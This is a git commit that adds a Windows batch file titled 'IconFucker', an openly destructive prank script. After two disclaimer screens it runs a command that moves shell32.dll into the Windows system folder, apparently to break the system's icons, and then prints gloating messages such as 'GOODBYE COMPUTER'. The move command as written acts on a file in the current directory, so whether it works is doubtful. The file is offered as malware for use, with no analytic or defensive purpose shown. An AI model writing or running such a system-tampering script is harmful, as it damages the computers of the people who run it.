39fe125c474e3866d1383da243dd37e76d16956e
MrSuperBuddy <141313920+red-wipet@users.noreply.github.com>
2023-12-04 22:11:58 +0300

    batch (I warned about it already)

---
+++ IconFucker.bat
@@ -0,0 +1,41 @@
+@ECHO OFF
+REM  QBFC Project Options Begin
+REM  HasVersionInfo: No
+REM Companyname: 
+REM Productname: 
+REM Filedescription: 
+REM Copyrights: 
+REM Trademarks: 
+REM Originalname: 
+REM Comments: 
+REM Productversion:  0. 0. 0. 0
+REM Fileversion:  0. 0. 0. 0
+REM Internalname: 
+REM ExeType: console
+REM Architecture: x64
+REM Appicon: 
+REM AdministratorManifest: No
+REM  QBFC Project Options End
+@ECHO ON
+@echo off
+title IconFucker
+echo Warning!!!
+echo This sortware is not reccomended to run on a real life machine!
+echo Anyways, creator will be not responsible for any damages!
+echo To exit, close this window
+echo To run, press any key
+pause
+cls
+echo LAST WARNING!!!
+echo This sortware is not reccomended to run on a real life machine!
+echo Anyways, creator will be not responsible for any damages!
+echo To exit, close this window
+echo To finally run, press any key
+pause
+cls
+move shell32.dll c:\windows\system\shell32.dll
+cls
+title I FUCKED ASS WITH ICONS!!!
+echo OK, ALL ICONS ARE FUCKED >:D 
+echo GOODBYE COMPUTER!!!
+pause
